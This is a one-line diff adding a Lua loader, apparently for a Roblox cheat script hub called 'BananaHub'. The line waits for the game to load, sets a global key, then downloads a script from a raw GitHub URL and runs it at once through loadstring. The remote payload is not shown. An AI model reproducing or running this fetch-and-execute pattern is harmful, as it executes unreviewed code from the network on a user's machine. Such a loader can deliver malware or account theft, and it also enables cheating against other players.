@@ -1,0 +1,1 @@
+local a=wait;local b=game;local c=loadstring;local d=HttpGet;repeat a()until b:IsLoaded()and b.Players.LocalPlayer;getgenv().Key="23b0a2ad2c54246b35c1009f";c(d("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/main/BananaHub.lua"))()
